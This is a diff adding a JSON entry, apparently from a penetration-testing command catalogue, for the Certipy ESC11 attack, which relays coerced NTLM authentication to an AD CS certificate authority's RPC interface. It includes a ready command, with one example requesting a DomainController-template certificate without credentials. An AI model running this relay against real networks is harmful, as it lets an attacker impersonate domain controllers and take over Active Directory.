@@ -1,0 +1,16 @@
+{
+  "id": "certipy-esc11",
+  "name": "Certipy ESC11 (RPC Relay to ICPR)",
+  "command": "certipy relay -target 'rpc://<ca-host>' -template '<template>'",
+  "description": "ESC11: ICertPassage RPC interface accepts NTLM without IF_ENFORCEENCRYPTICERTREQUEST. Relay coerced authentication to the CA's RPC endpoint and enroll certificates as the relayed identity.",
+  "platform": "linux",
+  "requires": ["no-creds"],
+  "protocols": ["rpc"],
+  "tags": ["certipy", "adcs", "esc11", "relay", "icpr"],
+  "references": [
+    { "title": "ESC11 writeup", "url": "https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/" }
+  ],
+  "examples": [
+    "certipy relay -target 'rpc://ca.corp.local' -template DomainController"
+  ]
+}
